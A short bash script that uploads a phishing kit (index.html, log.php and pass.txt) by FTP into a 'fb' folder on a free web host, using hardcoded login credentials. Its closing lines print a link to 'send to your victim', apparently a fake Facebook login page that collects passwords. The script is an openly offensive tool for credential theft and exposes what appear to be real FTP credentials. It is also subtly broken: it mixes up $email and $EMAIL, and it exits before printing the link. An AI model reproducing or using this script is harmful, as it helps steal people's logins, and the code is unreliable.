#!/bin/bash 
echo "Enter your email:"
read EMAIL
#Automated FTP transfer 
HOST='ftpupload.net' 
USER='epiz_32719615'
PASSWD='ElDdJprQglYAk'
FILE='index.html'
FILE2='log.php'
FILE3='pass.txt'
ftp -n $HOST <<END_SCRIPT
quote USER $USER
quote PASS $PASSWD
binary
cd htdocs/fb
mkdir $email
cd $EMAIL
mkdir link
cd link
put $FILE
put $FILE2
put $FILE3
quit
END_SCRIPT
exit 0
echo
echo "Send the link below to your victim:"
echo "http://clipush.42web.io/fb/$EMAIL/link/" 
